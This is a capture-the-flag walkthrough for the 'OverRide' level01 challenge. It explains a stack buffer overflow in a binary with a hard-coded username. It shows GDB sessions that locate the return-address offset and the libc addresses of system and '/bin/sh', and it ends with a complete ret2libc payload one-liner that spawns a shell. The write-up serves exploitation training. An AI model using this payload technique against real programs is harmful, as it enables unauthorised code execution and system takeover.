## WALKTHROUGH - LEVEL01

---

The binary is waiting for a username which is hard coded as "dat_wil",
afterward it asks for an 100 bytes password and stores it inside a 64 bytes
buffer which gives us an opportunity to overflow.

Later in the main, it stores the content of `EBP-0x8` at the top of the stack:

```sh
0x080485af <+223>:	lea    esp,[ebp-0x8]
```

So we put a breakpoint at this address, and if we pass 64 bytes exactly in the buffer, we can see our A are currently at `EBP-0x12`:

```sh
(gdb) b*0x080485af
(gdb) run < <(python -c 'print "dat_wil\n" + "A" * 64')
(gdb) x/1wx $ebp - 0x12
0xffffd6b6:	0x41414141
```

Which means the next bytes we write will give us control of the stack.

We need to control ret at the end of main function to get execution, there are 3
pop after this instruction to restore our registers which will consume esp 3 times.

So the offset is: **64 + 4 (ret addr) + (3 * pop <reg>) = 80**

We can then overwrite EIP.

We will use a Ret2libc attack to give us a shell, so we need to find the address of the **system** function and the address of a string that contains **"/bin/sh"**.

```sh
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) info proc mappings
0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so  <==== LIBC in memory

(gdb) find 0xf7e2c000, +9999999, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
```

Now we need to pass everything to the stack, so the payload will be:

**"dat_wil\n" + "A"\*80 + system address + system return address + system parameters**

```sh
level01@OverRide:~$ cat <(python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7" + "\n"') - | ./level01
```
